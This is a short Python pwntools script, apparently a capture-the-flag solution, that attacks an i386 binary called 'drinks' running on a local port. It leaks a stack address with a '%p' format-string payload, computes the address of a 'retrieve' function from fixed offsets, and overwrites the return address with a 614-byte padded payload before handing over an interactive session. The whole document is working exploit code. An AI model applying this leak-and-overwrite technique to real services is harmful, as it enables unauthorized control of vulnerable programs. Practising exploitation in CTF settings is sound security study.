from pwn import *
context.arch = 'i386'

binary = ELF('./drinks')
# p = process(binary.path)
p = remote("localhost", 6055)

# p: process = gdb.debug(binary.path,'''
#     aslr off
#     b vuln
#     c
# ''')

# Grab addresses
payload = b'%p ' * 3
p.sendline(payload)
p.recvuntil(b"What kind of drink do you want?")

recv = p.recvuntil(b"\n\nW").strip()
recv_text = recv.decode()

values = recv_text.split(' ')
vuln_leak = int(values[2], 16)

# Calculating addresses
vuln_addr = vuln_leak - 0xf
retrieve_addr = vuln_addr - 0x9a

log.info(f"vuln_addr leak: 0x{vuln_addr:04x}")

# Execute payload
offset = 614

payload = fit({
    offset: retrieve_addr
})

p.sendline(payload)
p.interactive()
